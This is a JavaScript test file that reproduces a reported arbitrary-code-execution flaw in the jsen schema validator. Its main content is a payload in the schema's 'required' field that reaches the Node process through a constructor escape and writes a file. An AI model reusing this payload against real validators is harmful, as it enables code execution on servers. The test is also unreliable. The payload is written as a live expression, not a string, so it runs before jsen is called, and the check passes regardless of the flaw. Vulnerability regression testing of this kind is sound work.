//https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670
test("Arbitrary code execution in jsen", () => {
  const fs = require("fs");
  const jsen = require("jsen");
  const path = "./jsen";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let schema = JSON.parse(
    JSON.stringify({
      type: "object",
      properties: {
        username: {
          type: "string",
        },
      },
      required: [
        "\\" +
          this.constructor
            .constructor(`return process`)()
            .mainModule.require(`fs`)
            .writeFileSync(`jsen`, ``) +
          "",
      ],
    })
  );

  try {
    const validate = jsen(schema);
    validate({});
  } catch (e) {}

  //sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
